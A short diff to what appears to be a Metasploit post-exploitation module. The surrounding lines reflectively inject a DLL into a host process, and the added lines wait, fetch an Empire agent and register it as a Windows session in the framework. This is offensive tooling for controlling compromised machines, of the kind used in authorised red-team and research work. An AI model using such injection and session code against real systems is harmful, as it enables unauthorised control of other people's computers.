@@ -69,6 +69,15 @@ class MetasploitModule < Msf::Post
       print_status("DLL Injected. Executing Reflective loader")
       host_process.thread.create(dll_mem + offset, 0)
       print_status("DLL injected and invoked")
+
+      #Fetching the agent at an interval of 7 seconds.
+      sleep(7)
+      agent_name = self.client_emp.get_agents(true)
+
+      #Register a Windows Session
+      empire_session = Msf::Sessions::EmpireShellWindows.new(client_emp, agent_name)
+      framework.sessions.register(empire_session)
+
     end
 
     #method to generate reflective DLL from empire-cli
